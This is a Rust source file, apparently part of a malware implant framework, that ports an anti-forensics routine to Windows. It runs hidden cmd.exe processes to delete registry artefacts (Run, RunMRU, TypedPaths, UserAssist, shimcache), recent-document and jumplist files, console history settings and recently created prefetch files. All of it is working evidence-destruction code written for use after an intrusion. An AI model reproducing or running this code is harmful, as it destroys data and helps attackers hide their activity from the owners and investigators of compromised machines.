//! Anti-forensics: clear registry artefacts and prefetch files (BOAZ anti_forensic port).

use core::ffi::c_void;
use core::mem::zeroed;
use core::ptr::null_mut;

use crate::types::{CREATE_NO_WINDOW, INFINITE, PROCESS_INFORMATION, STARTUPINFOA};
use malefic_os_win::kit::binding::{MCloseHandle, MCreateProcessA, MWaitForSingleObject};

// ─── Internal helper ──────────────────────────────────────────────────────────

/// Run a command string silently and wait for it to finish.
fn run_cmd(cmd: &str) {
    unsafe {
        let mut si: STARTUPINFOA = zeroed();
        si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
        // Hide window
        si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
        si.wShowWindow = 0; // SW_HIDE
        let mut pi: PROCESS_INFORMATION = zeroed();

        // Build: cmd.exe /C <cmd>
        let full: Vec<u8> = b"cmd.exe /C "
            .iter()
            .chain(cmd.as_bytes())
            .cloned()
            .chain(core::iter::once(0))
            .collect();

        let ok = MCreateProcessA(
            null_mut(),
            full.as_ptr() as *mut i8,
            null_mut(),
            null_mut(),
            0,
            CREATE_NO_WINDOW,
            null_mut(),
            null_mut(),
            &mut si as *mut STARTUPINFOA as *mut c_void,
            &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
        );
        if ok {
            MWaitForSingleObject(pi.hProcess, INFINITE);
            MCloseHandle(pi.hProcess);
            MCloseHandle(pi.hThread);
        }
    }
}

// ─── Prefetch cleanup ─────────────────────────────────────────────────────────

/// Delete `.pf` prefetch files created after the process started.
/// Uses `forfiles` to target only recently created entries.
fn delete_recent_prefetch() {
    run_cmd(r#"forfiles /p C:\Windows\Prefetch /m *.pf /d +0 /c "cmd /c del /f /q @path""#);
}

// ─── Registry cleanup ─────────────────────────────────────────────────────────

/// Clear common forensic artefacts from the registry.
pub fn anti_forensic() {
    // Run/MRU history
    run_cmd(r#"reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v * /f 2>nul"#);
    run_cmd(
        r#"reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f 2>nul"#,
    );

    // Typed paths (Win + R history)
    run_cmd(
        r#"reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f 2>nul"#,
    );

    // UserAssist (GUI program launch history)
    run_cmd(
        r#"reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f 2>nul"#,
    );

    // Recent docs / jumplists
    run_cmd(r#"del /f /q "%APPDATA%\Microsoft\Windows\Recent\*" 2>nul"#);
    run_cmd(r#"del /f /q /s "%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*" 2>nul"#);
    run_cmd(r#"del /f /q /s "%APPDATA%\Microsoft\Windows\Recent\CustomDestinations\*" 2>nul"#);

    // Console command history
    run_cmd(r#"reg delete "HKCU\Console" /v HistoryBufferSize /f 2>nul"#);

    // AppCompatCache (shimcache) — requires admin but attempt anyway
    run_cmd(
        r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /v AppCompatCache /f 2>nul"#,
    );

    // Prefetch files
    delete_recent_prefetch();
}
